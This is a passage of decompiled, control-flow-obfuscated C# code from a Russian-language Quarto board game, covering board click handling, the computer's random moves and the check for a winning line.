					num3 = (int)(num4 * 1180532075) ^ -1118130739;
					continue;
				case 10u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num3 = ((int)num4 * -923944265) ^ -1813681727;
					continue;
				case 9u:
					num3 = (int)((num4 * 701578225) ^ 0x73403D4D);
					continue;
				case 8u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num3 = ((int)num4 * -745911008) ^ 0x75AA7C4F;
						continue;
					}
					num7 = 0;
					goto IL_02d4;
				case 7u:
					num7 = ((board[num2, num] == null) ? 1 : 0);
					goto IL_02d4;
				case 6u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = 823838182;
						num6 = 823838182;
					}
					else
					{
						num5 = 1623400997;
						num6 = 1623400997;
					}
					num3 = num5 ^ (int)(num4 * 1587312861);
					continue;
				}
				case 5u:
					num3 = ((int)num4 * -1610618038) ^ -1647684670;
					continue;
				case 4u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num3 = ((int)num4 * -1849991696) ^ -47829594;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num3 = (int)(num4 * 1320405733) ^ -2098517042;
					continue;
				case 2u:
					Form1.smethod_45(graphics_);
					num3 = ((int)num4 * -1812348029) ^ -951216153;
					continue;
				case 1u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num3 = ((int)num4 * -911170373) ^ -1210794564;
					continue;
				default:
					return;
				case 0u:
					break;
				case 20u:
					return;
					IL_02d4:
					flag3 = (byte)num7 != 0;
					num3 = -621681143;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_1403: Unknown result type (might be due to invalid IL or missing references)
		//IL_1431: Expected O, but got Unknown
		Graphics graphics_ = default(Graphics);
		int num14 = default(int);
		int num15 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		int num10 = default(int);
		int num9 = default(int);
		bool flag10 = default(bool);
		int num39 = default(int);
		int num35 = default(int);
		int num21 = default(int);
		int num37 = default(int);
		int num32 = default(int);
		int num36 = default(int);
		bool flag3 = default(bool);
		int num56 = default(int);
		bool flag5 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		int num41 = default(int);
		bool flag14 = default(bool);
		bool flag12 = default(bool);
		int num16 = default(int);
		int num42 = default(int);
		bool flag8 = default(bool);
		bool flag4 = default(bool);
		bool flag2 = default(bool);
		int num3 = default(int);
		bool flag15 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		bool flag11 = default(bool);
		int num43 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		int num12 = default(int);
		int num13 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag13 = default(bool);
		bool flag6 = default(bool);
		bool flag9 = default(bool);
		bool flag7 = default(bool);
		while (true)
		{
			int num = 1157097113;
			while (true)
			{
				uint num2;
				int num22;
				int num55;
				int num25;
				int num38;
				switch ((num2 = (uint)num ^ 0x183DCB44u) % 171u)
				{
				case 170u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num14, num15]), num7 * size + 4, num8 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1500506209) ^ 0x1E47753E);
					continue;
				case 169u:
					num7 = 0;
					num = 1902718752;
					continue;
				case 168u:
					Form1.smethod_20(pictureBox[num10, num9], (Image)null);
					num = (int)(num2 * 989304729) ^ -1634625354;
					continue;
				case 167u:
					flag10 = true;
					num = ((int)num2 * -407514835) ^ -1762702039;
					continue;
				case 166u:
					num8++;
					num = ((int)num2 * -1878527371) ^ 0x2372E1D4;
					continue;
				case 165u:
					num39++;
					num = 275112342;
					continue;
				case 164u:
					if (storage[num35, num21] != null)
					{
						num = (int)((num2 * 42222547) ^ 0x7866EA1D);
						continue;
					}
					num22 = 1;
					goto IL_00f7;
				case 163u:
					Form1.smethod_5((Control)(object)borderBox[num37, num32], Color.LimeGreen);
					num = (int)((num2 * 1040051413) ^ 0x3A4FA40F);
					continue;
				case 162u:
					num36 = 0;
					num = (int)((num2 * 508190414) ^ 0x73D322FB);
					continue;
				case 161u:
				{
					int num65;
					int num66;
					if (!flag3)
					{
						num65 = -757674920;
						num66 = -757674920;
					}
					else
					{
						num65 = -1787508356;
						num66 = -1787508356;
					}
					num = num65 ^ (int)(num2 * 1555030109);
					continue;
				}
				case 160u:
					num36 = num9;
					num = (int)((num2 * 523852997) ^ 0x4EBD12A3);
					continue;
				case 159u:
					num56++;
					num = ((int)num2 * -1812488197) ^ 0x1AB881D6;
					continue;
				case 158u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 501345734) ^ 0x4EEE9500);
					continue;
				case 157u:
					num = 53504548;
					continue;
				case 156u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -282385007) ^ 0x7001214;
					continue;
				case 155u:
					flag5 = array2[num56, num39] == null;
					num = 1533159076;
					continue;
				case 154u:
					board[num8, num7] = new Figurine(storage[num14, num15]);
					num = (int)(num2 * 129329698) ^ -406384719;
					continue;
				case 153u:
					num = ((int)num2 * -489552217) ^ 0x672BE064;
					continue;
				case 152u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 558121231) ^ 0x3DC8F0D5);
					continue;
				case 151u:
					num55 = ((num41 < 9) ? 1 : 0);
					goto IL_026d;
				case 150u:
					num = (int)((num2 * 44123980) ^ 0x31E1A3E9);
					continue;
				case 149u:
					flag14 = num9 < 4;
					num = 1177741115;
					continue;
				case 148u:
					num10 = 0;
					num = ((int)num2 * -694298134) ^ 0x37340B03;
					continue;
				case 147u:
					if (!Stop(board))
					{
						num = ((int)num2 * -1535210394) ^ 0x53296607;
						continue;
					}
					goto IL_02d7;
				case 146u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -1844367721) ^ 0x7F0A817D;
					continue;
				case 145u:
					num = ((int)num2 * -1600585595) ^ -240254298;
					continue;
				case 144u:
					num = 1222980222;
					continue;
				case 143u:
					num = ((int)num2 * -480960225) ^ 0x5C091597;
					continue;
				case 142u:
				{
					int num48;
					int num49;
					if (!flag12)
					{
						num48 = 1694941249;
						num49 = 1694941249;
					}
					else
					{
						num48 = 2054669626;
						num49 = 2054669626;
					}
					num = num48 ^ (int)(num2 * 1789604274);
					continue;
				}
				case 141u:
					num16 = num9;
					num = (int)(num2 * 1267617110) ^ -1343343976;
					continue;
				case 140u:
					num35 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 2030508925) ^ -1044114108;
					continue;
				case 139u:
					num = ((int)num2 * -519708739) ^ -593193521;
					continue;
				case 138u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -36513415) ^ -613990087;
					continue;
				case 137u:
					num42 = 0;
					num = ((int)num2 * -832785784) ^ 0x32F54C7D;
					continue;
				case 136u:
					num41++;
					flag10 = false;
					num = 116588326;
					continue;
				case 135u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 157333083) ^ -289686232;
					continue;
				case 134u:
				{
					int num30;
					int num31;
					if (flag8)
					{
						num30 = -1694145737;
						num31 = -1694145737;
					}
					else
					{
						num30 = -1818609298;
						num31 = -1818609298;
					}
					num = num30 ^ (int)(num2 * 1949914805);
					continue;
				}
				case 133u:
					storage[num14, num15] = null;
					num = (int)((num2 * 1020586856) ^ 0x351CDCC4);
					continue;
				case 132u:
					num32 = 0;
					num = 547737347;
					continue;
				case 131u:
					num = (int)((num2 * 1292487431) ^ 0x4807DC89);
					continue;
				case 130u:
					num = (int)(num2 * 321341877) ^ -1872690684;
					continue;
				case 129u:
					num = ((int)num2 * -1724706827) ^ -1683296218;
					continue;
				case 128u:
				{
					int num24;
					if (board[num8, num7] != null)
					{
						num = 1283482661;
						num24 = 1283482661;
					}
					else
					{
						num = 586630588;
						num24 = 586630588;
					}
					continue;
				}
				case 127u:
					Form1.smethod_30((Control)(object)pictureBox[num10, num9]);
					num = (int)((num2 * 2043732612) ^ 0x29268DB9);
					continue;
				case 126u:
					num = ((int)num2 * -1812922908) ^ 0x5CFD7F1D;
					continue;
				case 125u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -890464980) ^ -1052987892;
					continue;
				case 124u:
					num = (int)(num2 * 758352846) ^ -1605023211;
					continue;
				case 123u:
					num = (int)(num2 * 1259797058) ^ -528579437;
					continue;
				case 122u:
					num = ((int)num2 * -1777114348) ^ 0x42EFE0B6;
					continue;
				case 121u:
					flag4 = num7 < 4;
					num = 1225574580;
					continue;
				case 120u:
					num = 1966902193;
					continue;
				case 119u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = ((int)num2 * -740276364) ^ -626448793;
					continue;
				case 118u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num7 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1674587376) ^ -631009425;
					continue;
				case 117u:
					flag2 = Standoff(board);
					num = (int)(num2 * 590387089) ^ -1415927096;
					continue;
				case 116u:
					num = ((int)num2 * -1603292492) ^ -196350725;
					continue;
				case 115u:
					num3 = 0;
					num = (int)(num2 * 366225869) ^ -1952119473;
					continue;
				case 114u:
					num42 = num10;
					num = ((int)num2 * -1547544515) ^ 0xAA3186B;
					continue;
				case 113u:
					num41 = 0;
					num = ((int)num2 * -1100390061) ^ -1457655999;
					continue;
				case 112u:
				{
					int num64;
					if (num56 < 4)
					{
						num = 517865286;
						num64 = 517865286;
					}
					else
					{
						num = 1980424471;
						num64 = 1980424471;
					}
					continue;
				}
				case 110u:
				{
					int num62;
					int num63;
					if (!flag15)
					{
						num62 = -334803093;
						num63 = -334803093;
					}
					else
					{
						num62 = -413797668;
						num63 = -413797668;
					}
					num = num62 ^ (int)(num2 * 1141888681);
					continue;
				}
				case 109u:
					Form1.smethod_5((Control)(object)borderBox[num10, num9], Color.White);
					num = ((int)num2 * -80552067) ^ -1302079303;
					continue;
				case 108u:
					num9 = 0;
					num = 1607058740;
					continue;
				case 107u:
					num9++;
					num = 1550783204;
					continue;
				case 106u:
					flag15 = Form1.smethod_41((Control)(object)borderBox[num37, num32]) == Color.Red;
					num = ((int)num2 * -1516031451) ^ -414451376;
					continue;
				case 105u:
					num37++;
					num = (int)(num2 * 694707806) ^ -647678078;
					continue;
				case 104u:
					num14 = 0;
					num15 = 0;
					num37 = 0;
					num = (int)(num2 * 703700963) ^ -1296863162;
					continue;
				case 103u:
					num56 = 0;
					num = ((int)num2 * -1852921621) ^ -98259863;
					continue;
				case 102u:
					Form1.smethod_30((Control)(object)borderBox[num14, num15]);
					num = (int)((num2 * 1957142748) ^ 0x35C066CC);
					continue;
				case 101u:
					num = 1380753124;
					continue;
				case 100u:
					num = ((int)num2 * -1876781372) ^ -1131013255;
					continue;
				case 99u:
				{
					int num61;
					if (num10 < 4)
					{
						num = 678625884;
						num61 = 678625884;
					}
					else
					{
						num = 1415411260;
						num61 = 1415411260;
					}
					continue;
				}
				case 98u:
					num = ((int)num2 * -162806765) ^ -111753087;
					continue;
				case 97u:
				{
					int num59;
					int num60;
					if (!flag14)
					{
						num59 = 1337633396;
						num60 = 1337633396;
					}
					else
					{
						num59 = 1572726453;
						num60 = 1572726453;
					}
					num = num59 ^ ((int)num2 * -31101632);
					continue;
				}
				case 96u:
					if (num35 == num14)
					{
						num = (int)(num2 * 1132300777) ^ -1056014058;
						continue;
					}
					num22 = 0;
					goto IL_00f7;
				case 95u:
					Form1.smethod_47(1000);
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num8 = 0;
					num = (int)((num2 * 1954484071) ^ 0x2FA16D2C);
					continue;
				case 94u:
					num = (int)(num2 * 569588919) ^ -1787846839;
					continue;
				case 93u:
					num = ((int)num2 * -90898946) ^ 0x134411C4;
					continue;
				case 92u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)((num2 * 2079299659) ^ 0x101D660D);
					continue;
				case 91u:
				{
					int num57;
					int num58;
					if (flag4)
					{
						num57 = 981429382;
						num58 = 981429382;
					}
					else
					{
						num57 = 1101499782;
						num58 = 1101499782;
					}
					num = num57 ^ ((int)num2 * -1198154305);
					continue;
				}
				case 90u:
					num = 529925058;
					continue;
				case 89u:
					num7++;
					num = 269942768;
					continue;
				case 88u:
					num = 717406709;
					continue;
				case 87u:
					flag11 = Form1.smethod_41((Control)(object)borderBox[num10, num9]) == Color.Blue;
					num = 884357914;
					continue;
				case 86u:
					Form1.smethod_30((Control)(object)borderBox[num35, num21]);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 1405291865) ^ 0x5C1A6415);
					continue;
				case 85u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 1225493584) ^ -401791880;
					continue;
				case 84u:
					Form1.smethod_30((Control)(object)borderBox[num37, num32]);
					num = ((int)num2 * -153724240) ^ -593738670;
					continue;
				case 83u:
					flag12 = num32 < 4;
					num = 488267518;
					continue;
				case 82u:
					Form1.smethod_20(pictureBox[num14, num15], (Image)null);
					num = (int)((num2 * 1977487250) ^ 0x1A3E11C5);
					continue;
				case 81u:
					num10++;
					num = (int)((num2 * 987514793) ^ 0x25ECE6E1);
					continue;
				case 80u:
					num43 = 0;
					num = ((int)num2 * -1000553772) ^ -696371665;
					continue;
				case 79u:
					num = ((int)num2 * -2059735633) ^ 0x14910155;
					continue;
				case 78u:
					num43 = num10;
					num = ((int)num2 * -1912582233) ^ 0x6A0E856B;
					continue;
				case 77u:
					num4++;
					num = ((int)num2 * -396834408) ^ -625356552;
					continue;
				case 76u:
					Form1.smethod_7((Control)(object)pictureBox[num37, num32], bool_0: false);
					num = 1374015882;
					continue;
				case 75u:
					Form1.smethod_5((Control)(object)borderBox[num14, num15], Color.White);
					num = ((int)num2 * -1601586302) ^ 0x3A2F3042;
					continue;
				case 74u:
					num39 = 0;
					num = 1847011380;
					continue;
				case 73u:
					num = 1283482661;
					continue;
				case 72u:
					Form1.smethod_30((Control)(object)pictureBox[num14, num15]);
					num = ((int)num2 * -1152588686) ^ -1519215948;
					continue;
				case 71u:
					flag = board[num12, num13] != null;
					num = ((int)num2 * -1509027262) ^ -2063545400;
					continue;
				case 70u:
					Form1.smethod_30((Control)(object)pictureBox[num14, num15]);
					num = ((int)num2 * -1050025643) ^ -489900137;
					continue;
				case 69u:
					num25 = (Standoff(array) ? 1 : 0);
					goto IL_0b79;
				case 68u:
					Form1.smethod_47(200);
					num = ((int)num2 * -726304324) ^ 0x64A8C5B0;
					continue;
				case 67u:
					num = (int)(num2 * 845910997) ^ -1187265711;
					continue;
				case 66u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array2);
					array3[num56, num39] = new Figurine(storage[num35, num21]);
					num = ((int)num2 * -647627059) ^ -563544925;
					continue;
				case 65u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)((num2 * 1727926599) ^ 0x3A09DA1B);
					continue;
				case 64u:
					num = ((int)num2 * -1376629230) ^ -985539262;
					continue;
				case 63u:
					num = ((int)num2 * -1184558733) ^ -1756854221;
					continue;
				case 62u:
					if (!flag10)
					{
						num = ((int)num2 * -1895441886) ^ -1251269621;
						continue;
					}
					num55 = 1;
					goto IL_026d;
				case 61u:
				{
					int num53;
					int num54;
					if (flag13)
					{
						num53 = -1970313390;
						num54 = -1970313390;
					}
					else
					{
						num53 = -1474135544;
						num54 = -1474135544;
					}
					num = num53 ^ ((int)num2 * -1206998238);
					continue;
				}
				case 60u:
					storage[num14, num15] = null;
					Form1.smethod_5((Control)(object)borderBox[num35, num21], Color.Blue);
					num = ((int)num2 * -1400458636) ^ -915442883;
					continue;
				case 59u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1410663023) ^ -1803580535;
					continue;
				case 58u:
					num = (int)((num2 * 280154239) ^ 0x5820726C);
					continue;
				case 57u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 2013320362;
					continue;
				case 56u:
					num = ((int)num2 * -455036887) ^ -1787662883;
					continue;
				case 55u:
				{
					int num52;
					if (num4 < 4)
					{
						num = 741371503;
						num52 = 741371503;
					}
					else
					{
						num = 1903262772;
						num52 = 1903262772;
					}
					continue;
				}
				case 54u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num14, num15], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num14, num15]);
					Form1.smethod_20(pictureBox[num14, num15], (Image)null);
					num = ((int)num2 * -1389258359) ^ -1570610335;
					continue;
				case 53u:
					num = ((int)num2 * -2041716365) ^ 0x23E3ADC9;
					continue;
				case 52u:
					num13 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 1847872364) ^ 0x23492C3E);
					continue;
				case 51u:
					num32++;
					num = (int)(num2 * 2010691263) ^ -391489211;
					continue;
				case 50u:
					num12 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 2038521674) ^ -632566326;
					continue;
				case 49u:
					num = ((int)num2 * -481504381) ^ -1167082229;
					continue;
				case 48u:
				{
					int num50;
					int num51;
					if (!flag6)
					{
						num50 = 889142631;
						num51 = 889142631;
					}
					else
					{
						num50 = 575420332;
						num51 = 575420332;
					}
					num = num50 ^ (int)(num2 * 515205441);
					continue;
				}
				case 47u:
				{
					int num46;
					int num47;
					if (Stop(array3))
					{
						num46 = -966723976;
						num47 = -966723976;
					}
					else
					{
						num46 = -1797348267;
						num47 = -1797348267;
					}
					num = num46 ^ ((int)num2 * -1753118775);
					continue;
				}
				case 46u:
				{
					int num44;
					int num45;
					if (flag11)
					{
						num44 = 61821283;
						num45 = 61821283;
					}
					else
					{
						num44 = 706233189;
						num45 = 706233189;
					}
					num = num44 ^ ((int)num2 * -993079363);
					continue;
				}
				case 45u:
					num = (int)(num2 * 1188508462) ^ -1385775673;
					continue;
				case 44u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num14, num15]), num13 * size + 4, num12 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1176018960) ^ -1647626048;
					continue;
				case 43u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 2113754950) ^ 0x2DF59E91);
					continue;
				case 42u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 249357458) ^ -75313177;
					continue;
				case 41u:
					flag8 = num37 < 4;
					num = 1321108486;
					continue;
				case 40u:
					board[num43, num36] = new Figurine(storage[num42, num16]);
					storage[num42, num16] = null;
					num = ((int)num2 * -1069762386) ^ -1637917191;
					continue;
				case 39u:
				{
					int num40;
					if (num39 >= 4)
					{
						num = 1634450133;
						num40 = 1634450133;
					}
					else
					{
						num = 509396891;
						num40 = 509396891;
					}
					continue;
				}
				case 38u:
					num14 = num37;
					num15 = num32;
					num = ((int)num2 * -1283675895) ^ -1655203654;
					continue;
				case 37u:
					num = (int)(num2 * 689750611) ^ -1327006522;
					continue;
				case 36u:
					num = ((int)num2 * -1858477521) ^ 0x7F2C1CA6;
					continue;
				case 35u:
					if (!Standoff(board))
					{
						num = 564023387;
						num38 = 564023387;
						continue;
					}
					goto IL_02d7;
				case 34u:
				{
					int num33;
					int num34;
					if (!flag9)
					{
						num33 = -524475510;
						num34 = -524475510;
					}
					else
					{
						num33 = -1405858697;
						num34 = -1405858697;
					}
					num = num33 ^ (int)(num2 * 1329272684);
					continue;
				}
				case 33u:
				{
					int num28;
					int num29;
					if (flag2)
					{
						num28 = 1040211982;
						num29 = 1040211982;
					}
					else
					{
						num28 = 879626128;
						num29 = 879626128;
					}
					num = num28 ^ (int)(num2 * 1968464271);
					continue;
				}
				case 32u:
				{
					int num26;
					int num27;
					if (flag7)
					{
						num26 = 524375034;
						num27 = 524375034;
					}
					else
					{
						num26 = 782039067;
						num27 = 782039067;
					}
					num = num26 ^ ((int)num2 * -472411926);
					continue;
				}
				case 31u:
					Paint_Board();
					num = (int)((num2 * 458369938) ^ 0x28FF4CC2);
					continue;
				case 29u:
					flag6 = Standoff(board);
					num = 1300951853;
					continue;
				case 28u:
					num21 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 183543366) ^ 0xF83FD68);
					continue;
				case 27u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num12, num13] = new Figurine(storage[num14, num15]);
					num = (int)((num2 * 2038472864) ^ 0x6406B847);
					continue;
				case 26u:
					num = (int)(num2 * 2069582385) ^ -1976373106;
					continue;
				case 25u:
					if (!Stop(array))
					{
						num = (int)((num2 * 2118516346) ^ 0x73611585);
						continue;
					}
					num25 = 1;
					goto IL_0b79;
				case 24u:
					num4 = 0;
					num = 448071352;
					continue;
				case 23u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num13 + 0.05f) * (float)size, ((float)num12 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -2144842648) ^ 0x27786C06;
					continue;
				case 22u:
					Form1.smethod_30((Control)(object)borderBox[num10, num9]);
					num = (int)(num2 * 1735893355) ^ -1086687865;
					continue;
				case 21u:
					num = (int)((num2 * 851076496) ^ 0x674760AD);
					continue;
				case 20u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 766174606;
					continue;
				case 19u:
				{
					int num23;
					if (num3 < 4)
					{
						num = 207277504;
						num23 = 207277504;
					}
					else
					{
						num = 539117237;
						num23 = 539117237;
					}
					continue;
				}
				case 18u:
					num = (int)((num2 * 89407643) ^ 0x2A5957C4);
					continue;
				case 17u:
					num = ((int)num2 * -1645675296) ^ -1351370315;
					continue;
				case 16u:
					num22 = ((num21 == num15) ? 1 : 0);
					goto IL_00f7;
				case 15u:
					array[num8, num7] = new Figurine(storage[num14, num15]);
					num = (int)(num2 * 1483465252) ^ -59472155;
					continue;
				case 14u:
				{
					int num19;
					int num20;
					if (flag5)
					{
						num19 = 2033656755;
						num20 = 2033656755;
					}
					else
					{
						num19 = 675027396;
						num20 = 675027396;
					}
					num = num19 ^ (int)(num2 * 891471569);
					continue;
				}
				case 13u:
				{
					int num17;
					int num18;
					if (Form1.smethod_46((Control)(object)pictureBox1))
					{
						num17 = -577305226;
						num18 = -577305226;
					}
					else
					{
						num17 = -1868531713;
						num18 = -1868531713;
					}
					num = num17 ^ ((int)num2 * -341681473);
					continue;
				}
				case 12u:
					Form1.smethod_15(timer1);
					num = 1957309387;
					continue;
				case 11u:
					num16 = 0;
					num = ((int)num2 * -1530565790) ^ 0x175261CA;
					continue;
				case 10u:
					flag3 = num8 < 4;
					num = 667509994;
					continue;
				case 9u:
					num = ((int)num2 * -1372874769) ^ 0x185C392A;
					continue;
				case 8u:
					board[num12, num13] = new Figurine(storage[num14, num15]);
					num = ((int)num2 * -2009621386) ^ -467832257;
					continue;
				case 7u:
					num = (int)((num2 * 1937891574) ^ 0x7CAB1680);
					continue;
				case 6u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -2146144550) ^ -2035343055;
					continue;
				case 5u:
					num3++;
					num = (int)((num2 * 1880424643) ^ 0x7B0848CB);
					continue;
				case 4u:
				{
					int num11;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num9 * size + size / 2, (int)(((float)num10 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = 846733712;
						num11 = 846733712;
					}
					else
					{
						num = 779553548;
						num11 = 779553548;
					}
					continue;
				}
				case 3u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = 1726568810;
						num6 = 1726568810;
					}
					else
					{
						num5 = 1016893882;
						num6 = 1016893882;
					}
					num = num5 ^ (int)(num2 * 1771299259);
					continue;
				}
				case 2u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -758098299) ^ 0x36D574D;
					continue;
				case 1u:
					num = ((int)num2 * -2109297460) ^ 0x4CE15884;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = 2024407388;
					continue;
				default:
					return;
				case 111u:
					break;
				case 30u:
					return;
					IL_00f7:
					flag13 = (byte)num22 != 0;
					num = 48273782;
					continue;
					IL_02d7:
					num = 1794860948;
					num38 = 1794860948;
					continue;
					IL_0b79:
					flag7 = (byte)num25 != 0;
					num = 39925284;
					continue;
					IL_026d:
					flag9 = (byte)num55 != 0;
					num = 1420018202;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num3 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 1099094516;
			while (true)
			{
				uint num2;
				int num35;
				int num29;
				switch ((num2 = (uint)num ^ 0x29F532DEu) % 77u)
				{
				case 76u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)((num2 * 980389332) ^ 0x617B57B3);
						continue;
					}
					goto IL_0035;
				case 75u:
				{
					int num63;
					int num64;
					if (mem[3, 3] != null)
					{
						num63 = -856836343;
						num64 = -856836343;
					}
					else
					{
						num63 = -1777191762;
						num64 = -1777191762;
					}
					num = num63 ^ (int)(num2 * 1389247008);
					continue;
				}
				case 74u:
				{
					int num24;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 1835317431;
						num24 = 1835317431;
					}
					else
					{
						num = 2044897827;
						num24 = 2044897827;
					}
					continue;
				}
				case 73u:
				{
					int num68;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 2067715283;
						num68 = 2067715283;
					}
					else
					{
						num = 1444791230;
						num68 = 1444791230;
					}
					continue;
				}
				case 72u:
				{
					int num18;
					int num19;
					if (mem[num3, 1].Square != mem[num3, 2].Square)
					{
						num18 = 2061477371;
						num19 = 2061477371;
					}
					else
					{
						num18 = 1166011841;
						num19 = 1166011841;
					}
					num = num18 ^ (int)(num2 * 1609126424);
					continue;
				}
				case 71u:
				{
					int num47;
					int num48;
					if (!flag2)
					{
						num47 = 476922953;
						num48 = 476922953;
					}
					else
					{
						num47 = 1334099566;
						num48 = 1334099566;
					}
					num = num47 ^ (int)(num2 * 2095600863);
					continue;
				}
				case 70u:
					num35 = ((mem[2, num3].Square == mem[3, num3].Square) ? 1 : 0);
					goto IL_0167;
				case 69u:
					num = 1557053014;
					continue;
				case 68u:
				{
					int num6;
					int num7;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num6 = 1869039957;
						num7 = 1869039957;
					}
					else
					{
						num6 = 1423792928;
						num7 = 1423792928;
					}
					num = num6 ^ (int)(num2 * 1578592991);
					continue;
				}
				case 67u:
					if (mem[3, num3] != null)
					{
						num = ((int)num2 * -1619739172) ^ -693269584;
						continue;
					}
					goto IL_01da;
				case 66u:
				{
					int num53;
					int num54;
					if (mem[1, num3].Dark == mem[2, num3].Dark)
					{
						num53 = 1171855604;
						num54 = 1171855604;
					}
					else
					{
						num53 = 648211684;
						num54 = 648211684;
					}
					num = num53 ^ (int)(num2 * 901352913);
					continue;
				}
				case 65u:
				{
					int num38;
					int num39;
					if (mem[num3, 0].Big == mem[num3, 1].Big)
					{
						num38 = 321099796;
						num39 = 321099796;
					}
					else
					{
						num38 = 1164024671;
						num39 = 1164024671;
					}
					num = num38 ^ ((int)num2 * -1381033198);
					continue;
				}
				case 64u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = 1956334704;
						continue;
					}
					goto IL_0285;
				case 63u:
				{
					int num12;
					int num13;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num12 = -446014537;
						num13 = -446014537;
					}
					else
					{
						num12 = -623375842;
						num13 = -623375842;
					}
					num = num12 ^ (int)(num2 * 1549083829);
					continue;
				}
				case 61u:
				{
					int num20;
					int num21;
					if (mem[1, 1] == null)
					{
						num20 = -1883325266;
						num21 = -1883325266;
					}
					else
					{
						num20 = -697489557;
						num21 = -697489557;
					}
					num = num20 ^ ((int)num2 * -1331597212);
					continue;
				}
				case 60u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = ((int)num2 * -110093018) ^ 0x568C6278;
						continue;
					}
					goto IL_0285;
				case 59u:
				{
					int num65;
					if (mem[num3, 0].Square != mem[num3, 1].Square)
					{
						num = 1394817835;
						num65 = 1394817835;
					}
					else
					{
						num = 1974194880;
						num65 = 1974194880;
					}
					continue;
				}
				case 58u:
				{
					int num55;
					int num56;
					if (mem[num3, 1].Big != mem[num3, 2].Big)
					{
						num55 = 459898841;
						num56 = 459898841;
					}
					else
					{
						num55 = 855759729;
						num56 = 855759729;
					}
					num = num55 ^ ((int)num2 * -1804973161);
					continue;
				}
				case 57u:
				{
					int num49;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 1818504961;
						num49 = 1818504961;
					}
					else
					{
						num = 336396385;
						num49 = 336396385;
					}
					continue;
				}
				case 56u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -1535466717) ^ -3823026;
						continue;
					}
					goto IL_040d;
				case 55u:
				{
					int num32;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = 2009256174;
						num32 = 2009256174;
					}
					else
					{
						num = 1432414818;
						num32 = 1432414818;
					}
					continue;
				}
				case 54u:
